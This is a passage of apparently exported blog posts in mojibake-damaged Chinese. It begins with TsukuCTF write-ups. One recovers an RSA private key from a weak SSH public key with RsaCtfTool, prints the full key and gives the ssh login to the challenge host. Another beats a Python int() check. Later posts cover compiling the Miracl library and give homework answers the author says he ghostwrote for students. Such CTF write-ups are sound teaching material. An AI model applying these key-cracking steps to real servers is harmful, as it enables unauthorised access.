<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
</code></pre>
<p>å‚è€ƒçŸ¥ä¹(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygenç”Ÿæˆçš„id_rsaæ–‡ä»¶çš„æ ¼å¼</a>)ä¸Šçš„çš„ä¸€ç¯‡æ–‡ç« :</p>
<p>é¦–å…ˆ,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,å¾—åˆ°:</p>
<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
00000115
</code></pre>
<ul>
<li><p>å‰4ä¸ªå­—èŠ‚(00 00 00 07)è¡¨ç¤ºæ¥ä¸‹æ¥çš„æ•°æ®å—æ˜¯7ä¸ªå­—èŠ‚,æ¥ä¸‹æ¥7ä¸ªå­—èŠ‚çš„å†…å®¹æ˜¯73 73 68 2d 72 73 61,æ­£å¥½æ˜¯<code>ssh-rsa</code>çš„ASCIIç </p>
</li>
<li><p>æ¥ä¸‹æ¥å››ä¸ªå­—èŠ‚(00 00 00 81)è¡¨ç¤ºæ¥ä¸‹æ¥çš„æ•°æ®å—æ˜¯0x81ä¸ªå­—èŠ‚,å¾—åˆ°eçš„16è¿›åˆ¶</p>
</li>
<li><p>å†æ¥ä¸‹æ¥å››ä¸ªå­—èŠ‚(00 00 00 81)è¡¨ç¤ºæ¥ä¸‹æ¥çš„æ•°æ®å—æ˜¯0x81ä¸ªå­—èŠ‚,å¾—åˆ°nçš„16è¿›åˆ¶</p>
<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
129
~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
</code></pre>
</li>
</ul>
<blockquote>
<p>å®˜æ–¹çš„Writeupç»™äº†å¦ä¸€ç§åšæ³•,å¯ä»¥ç›´æ¥å¾—åˆ°eå’Œnçš„16è¿›åˆ¶è¡¨ç¤ºå½¢å¼</p>
<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
    0:d=0  hl=4 l= 264 cons: SEQUENCE          
    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
</code></pre>
</blockquote>
<p>ä½¿ç”¨<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>ç”Ÿæˆç§é’¥,ä¿å­˜è‡³<code>id_rsa</code></p>
<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
</code></pre>
<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
+WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
-----END RSA PRIVATE KEY-----
</code></pre>
<pre><code class="shell">chmod 600 id_rsa
ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
</code></pre>
<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¯é«˜é€Ÿã«æ­£ã—ãè¨ˆç®—ã—ã¦ãã‚Œã¾ã™ãŒã€æ˜”ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¯ä»Šã»ã©æ­£ç¢ºã«è¨ˆç®—ã§ããªã„ã“ã¨ãŒã‚ã‚Šã¾ã—ãŸã€‚ç¾åœ¨ã‚‚ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ã®æ•…éšœãªã©ãŒåŸå› ã§ã¨ã¦ã‚‚ä½ã„ç¢ºç‡ã§ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¯è¨ˆç®—ã‚’ãƒŸã‚¹ã™ã‚‹ã§ã—ã‚‡ã†ã€‚ é‹ãŒè‰¯ã„ã‚ãªãŸãªã‚‰ã“ã®å•é¡ŒãŒè§£ã‘ã‚‹ã¯ãšã§ã™ã€‚10 æ¡ã®å¥½ããªæ•°å­—ã‚’ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ q ã«å…¥ã‚Œã¦ã€ç¥ã«ç¥ˆã‚Šã¾ã—ã‚‡ã†ã€‚</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
<hr>
<p>è®¿é—®<code>problems/digits</code>:</p>
<pre><code class="json">&#123;
    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
&#125;
</code></pre>
<p>é¢˜ç›®ç»™äº†æºç ï¼š</p>
<pre><code class="python">from typing import Optional
from fastapi import FastAPI
import random

app = FastAPI()
FLAG = &quot;TsukuCTF&#123;&#125;&quot;

@app.get(&quot;/&quot;)
def main(q: Optional[str] = None):
    print(q)
    if q == None:
        return &#123;
            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
        &#125;
    if len(q) != 10:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    if &quot;-&quot; in q or &quot;+&quot; in q:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    try:
        if not type(int(q)) is int:
            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    except:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;

    you_are_lucky = 0

    for _ in range(100):
        idx = random.randrange(4)
        if q[idx] &lt; &quot;0&quot;:
            you_are_lucky += 1
        if q[idx] &gt; &quot;9&quot;:
            you_are_lucky += 1

    if you_are_lucky &gt; 0:
        return &#123;&quot;flag&quot;: FLAG&#125;
    else:
        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
</code></pre>
<p>è¦æ±‚æ‰¾åˆ°æŸ¥è¯¢å‚æ•°qçš„å€¼ï¼Œæ»¡è¶³:</p>
<ul>
<li><code>q != None</code></li>
<li><code>len(q) == 10</code></li>
<li>ä¸åŒ…å«<code>-</code>å’Œ<code>+</code></li>
<li>å¯ä»¥ä½¿ç”¨<code>int(q)</code>è¿›è¡Œè½¬æ¢</li>
<li>è‡³å°‘åŒ…å«ä¸€ä¸ª0-9ä¹‹å¤–çš„å­—ç¬¦</li>
</ul>
<p><code>python</code>ä¸­ä½¿ç”¨<code>int</code>è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ä¼šå¿½ç•¥ä¸¤ä¾§çš„ç©ºæ ¼ï¼Œæäº¤<code>q=   4567890</code>å³å¯</p>
<pre><code class="json">&#123;
    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
&#125;
</code></pre>
<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TsukuCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsä¸‹ç¼–è¯‘Miraclå¯†ç åº“</title>
    <url>/posts/2543483413/</url>
    <content><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>Miraclæ˜¯ä¸€ä¸ªå¯†ç å­¦Cè¯­è¨€å‡½æ•°åº“,ç½‘ä¸Šé’ˆå¯¹Windowsç¯å¢ƒä¸‹ä½¿ç”¨çš„æ•™ç¨‹éƒ½æ˜¯ä½¿ç”¨MSVCç¼–è¯‘çš„,æ­¥éª¤æ¯”è¾ƒç¹ç,è¿˜éœ€å®‰è£…Visual Studioã€‚çœ‹äº†ä¸€ä¸‹å®˜ç½‘æ–‡æ¡£,æ˜¯æ”¯æŒä½¿ç”¨gccè¿›è¡Œç¼–è¯‘çš„,é‚å°è¯•äº†ä¸€ä¸‹ã€‚</p>
<h1 id="æ‰€éœ€ç¯å¢ƒ"><a href="#æ‰€éœ€ç¯å¢ƒ" class="headerlink" title="æ‰€éœ€ç¯å¢ƒ"></a>æ‰€éœ€ç¯å¢ƒ</h1><ul>
<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
</ul>
<h1 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h1><ol>
<li>ä»Githubä¸Šä¸‹è½½é¡¹ç›®æœ€æ–°æºç ã€‚(<a href="https://github.com/miracl/MIRACL/archive/master.zip">ä¸‹è½½åœ°å€</a>)</li>
<li>æ‰“å¼€Git Bash,åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹<code>miracl</code>ï¼Œå¹¶å°†å‹ç¼©æ–‡ä»¶æ‹·è´è‡³æ­¤ã€‚<br><code>mkdir miracl</code></li>
<li>æ‰“å¼€Git Bashï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ‰€æœ‰æ–‡ä»¶è§£å‹åˆ°ä¸€ä¸ªç›®å½•ä¸­ã€‚<br><code>unzip -j -aa -L master.zip</code></li>
<li>ç¼–è¾‘<code>gcdoit.bat</code>ï¼Œæ³¨é‡Šæ‰æœ€åå‡ è¡Œå¹¶ä¿å­˜ã€‚<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
<li>æ‰§è¡Œ<code>gcdoit.bat</code>,ç”Ÿæˆçš„<code>miracl.a</code>å³ä¸ºç¼–è¯‘å¥½çš„åº“ã€‚</li>
</ol>
<h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><ol>
<li><p>æ‰“å¼€CodeBlocksï¼Œæ–°å»ºConsole applicationé¡¹ç›®ã€‚</p>
<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
<li><p>å°†<code>mirdef.h</code>ã€<code>miracl.h</code>ã€<code>miracl.a</code>æ‹·è´è‡³é¡¹ç›®æ ¹ç›®å½•ã€‚</p>
</li>
<li><p>å¯¹ç€CBå·¦ä¾§å·¥ä½œç©ºé—´ä¸­çš„é¡¹ç›®åå³é”®ï¼Œç‚¹å‡»æ·»åŠ æ–‡ä»¶,å°†ä¸Šè¿°ä¸‰ä¸ªæ–‡ä»¶æ·»åŠ è‡³é¡¹ç›®ä¸­ã€‚</p>
<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
<li><p>CBä¼šå¼¹å‡ºå¦‚ä¸‹é”™è¯¯æç¤º,è«æ…Œ.</p>
<img data-src="/posts/2543483413/error.png" class=""></li>
<li><p>å¯¹ç€CBå·¦ä¾§å·¥ä½œç©ºé—´ä¸­çš„é¡¹ç›®åå³é”®,ç‚¹å‡»ç”Ÿæˆé€‰é¡¹,ä¿®æ”¹é“¾æ¥å™¨è®¾ç½®.</p>
<img data-src="/posts/2543483413/pasted-4.png" class="">
<div class="note warning">
            <p>ç¯å¢ƒè®¾ç½®é€‰æ‹©: ä»…ä½¿ç”¨é¡¹ç›®é€‰é¡¹</p>
          </div></li>
<li><p>åœ¨<code>main.c</code>ä¸­è¾“å…¥å¦‚ä¸‹ä»£ç ï¼Œè¿›è¡Œæµ‹è¯•ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>ç‚¹å‡»CBä¸­çš„ç”Ÿæˆå¹¶è¿è¡ŒæŒ‰é’®ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚</p>
<img data-src="/posts/2543483413/pasted-5.png" class="" title="è¿è¡Œç»“æœå›¾">
</li>
<li><p>gccç¼–è¯‘å‘½ä»¤ä¸º:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul>
<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">æ ‘è“æ´¾ä¸‹ç¼–è¯‘å¹¶ä½¿ç”¨miraclå¯†ç åº“</a></li>
<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Miracl</tag>
        <tag>å¯†ç å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨Python</title>
    <url>/posts/2604890615/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰å‡ æ—¥ä»£å†™ç•™å­¦ç”Ÿä½œä¸šæ—¶é‡åˆ°äº†ä¸¤é“å¾ˆæœ‰æ„æ€çš„Pythonç¼–ç¨‹é¢˜ï¼Œåœ¨æ­¤åšä¸€è®°å½•ï¼Œä¸»è¦æ¶‰åŠåˆ°ä¸€äº›Pythonçš„é«˜çº§ç‰¹æ€§:ç”Ÿæˆå™¨ã€lambdaè¡¨è¾¾å¼ã€‚</p>
<span id="more"></span>

<h1 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h1><h2 id="é¢˜æ„"><a href="#é¢˜æ„" class="headerlink" title="é¢˜æ„"></a>é¢˜æ„</h2><p><strong>åŸæ–‡:</strong><br>Consider the following function</p>
<div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># listOfNumbers is a list of only numbers</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">processList</span>(<span class="params">listOfNumbers</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listOfNumbers:</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="number">0</span> == <span class="number">0</span>:</span><br><span class="line">            result.append(i*i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append((i*i)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
    </div>
</div>

<p>First, study and test processList(listOfNumbers) to determine what it does Then rewrite its body so that it accomplishes the same task with a one-line list comprehension. Thus, the resulting function will have exactly two lines, the def line and a return line containing a list comprehension expression.<br><strong>ç¿»è¯‘:</strong><br>å°†ç»™å‡ºçš„ä¸€ä¸ªå‡½æ•°å˜æˆä¸¤è¡Œ</p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å‡½æ•°çš„åŠŸèƒ½æ˜¯:éå†listofNumbersä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœå¤§äºç­‰äº0ï¼Œå°†å…¶å˜æˆè‡ªå·±ä¹˜ä»¥è‡ªå·±ï¼Œå¦åˆ™å˜ä¸ºè‡ªå·±ä¹˜è‡ªå·±åå†åŠ ä¸€ã€‚<br>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åˆ°Pythonä¸­çš„ä¸‰å…ƒè¡¨è¾¾å¼ï¼Œä¸‹é¢è¿™ä¸¤ç§æ–¹å¼æ˜¯ç­‰ä»·çš„ã€‚<br><code>value = true if condition else false</code><br>ä¸</p>
<div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    value = true</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    value = false</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h2 id="å‚è€ƒç­”æ¡ˆ"><a href="#å‚è€ƒç­”æ¡ˆ" class="headerlink" title="å‚è€ƒç­”æ¡ˆ"></a>å‚è€ƒç­”æ¡ˆ</h2><div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">processList</span>(<span class="params">listOfNumbers</span>):</span><br><span class="line">    <span class="keyword">return</span> [i * i <span class="keyword">if</span> i &gt;= <span class="number">0</span> <span class="keyword">else</span> i * i + <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> listOfNumbers]</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h1 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h1><h2 id="é¢˜æ„-1"><a href="#é¢˜æ„-1" class="headerlink" title="é¢˜æ„"></a>é¢˜æ„</h2><p><strong>åŸæ–‡:</strong><br>Implement function processList2(inputList, specialItem, ignoreItems) that returns a new list that contains all the items of inputList (and in the original order) except 1) any that appear in the list ignoreItems, and 2) occurrences of specialItem (if specialItem is not in ignoreItems) should become the string &quot;special&quot; in the new list. Use a one-line list cluoomprehension to construct the new list. Thus, again, the function will have exactly two lines, the def line and a return line containing a list comprehension expression. For example,</p>
<div class="note default no-icon">
            <p>processList2([1,2,3,4], 4, [3])<br>[1, 2, &#39;special&#39;]<br>processList2([1,2,3,4,True,&#39;dog&#39;], 4, [3,5,4])<br>[1, 2, True, &#39;dog&#39;]<br>processList2([1,1,2,2], 1, [2])<br>[&#39;special&#39;, &#39;special&#39;]</p>
          </div>
<p><strong>ç¿»è¯‘:</strong><br>å®ç°å‡½æ•°processList2(inputList, specialItem, ignoreItems)ï¼Œå¯¹inputListä¸­çš„å…ƒç´ è¿›è¡Œå¤„ç†ï¼Œè¿”å›ä¸€ä¸ªæ–°åˆ—è¡¨ï¼Œä½†éœ€æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªè¦æ±‚:</p>
<ol>
<li>ä¸èƒ½æ˜¯å‡ºç°åœ¨ignoreItemsä¸­çš„å…ƒç´ </li>
<li>å¯¹äºä¸specialItemç›¸åŒçš„å…ƒç´ (ä¸èƒ½åœ¨ignoreItemsä¸­å‡ºç°)ï¼Œå°†å…¶å˜æˆ&quot;special&quot;ã€‚</li>
</ol>
<h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ol>
<li>é¦–å…ˆå°†ä¸åœ¨ignoreItemsä¸­çš„é‚£äº›å…ƒç´ ç­›å‡ºæ¥<code>[x for x in inputList if x not in ignoreItems]</code>æˆ–<code>list(filter(lambda x:False if x in ignoreItems else True,inputList))</code>ã€‚</li>
<li>ç„¶åéå†ä¸Šè¿°åˆ—è¡¨ä¸­çš„å…ƒç´ ï¼Œå°†specialItemå˜æˆ&quot;special&quot;,<code>[&quot;special&quot; if x == specialItem else x for x in xxx]</code></li>
</ol>
<h2 id="å‚è€ƒç­”æ¡ˆ-1"><a href="#å‚è€ƒç­”æ¡ˆ-1" class="headerlink" title="å‚è€ƒç­”æ¡ˆ"></a>å‚è€ƒç­”æ¡ˆ</h2><div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">processList2</span>(<span class="params">inputList, specialItem, ignoreItems</span>):</span><br><span class="line">    <span class="comment">## two method</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&quot;special&quot;</span> <span class="keyword">if</span> x == specialItem <span class="keyword">else</span> x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:<span class="literal">False</span> <span class="keyword">if</span> x <span class="keyword">in</span> ignoreItems <span class="keyword">else</span> <span class="literal">True</span>,inputList))]</span><br><span class="line">    <span class="keyword">return</span>[<span class="string">&quot;special&quot;</span> <span class="keyword">if</span> x == specialItem <span class="keyword">else</span> x <span class="keyword">for</span> x <span class="keyword">in</span> [x <span class="keyword">for</span> x <span class="keyword">in</span> inputList <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ignoreItems]]</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul>
<li><a href="http://www.runoob.com/python3/python3-func-filter.html">filter() å‡½æ•°</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431779637539089fd627094a43a8a7c77e6102e3a811000">åˆ—è¡¨ç”Ÿæˆå¼</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>lambda</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨Pythonç”»å°æ ‘å’Œæ£®æ—ï¼ˆå®½åº¦ä¼˜å…ˆç»˜åˆ¶+æ·±åº¦ä¼˜å…ˆç»˜åˆ¶)</title>
    <url>/posts/15900/</url>
    <content><![CDATA[<p>åœ¨ä¸­Mä¸Šçœ‹åµ©å¤©è€å¸ˆçš„<a href="http://www.icourse163.org/learn/BIT-268001">ã€ŠPythonè¯­è¨€ç¨‹åºè®¾è®¡ã€‹</a>æ—¶,è§†é¢‘ä¸­ç»™å‡ºäº†å®½åº¦ä¼˜å…ˆç»˜åˆ¶æ³•çš„ä»£ç ,ä»…æäº†ä¸€ä¸‹è¿˜æœ‰å¦å¤–ä¸€ç§ç”»æ³•(æ·±åº¦ä¼˜å…ˆç»˜åˆ¶æ³•).è”ç³»åˆ°æœ€è¿‘å­¦çš„æ•°æ®ç»“æ„ï¼Œæ‘¸ç´¢å‡ºäº†å¦ä¸€ç§ç”»æ³•ã€‚</p>
<span id="more"></span>
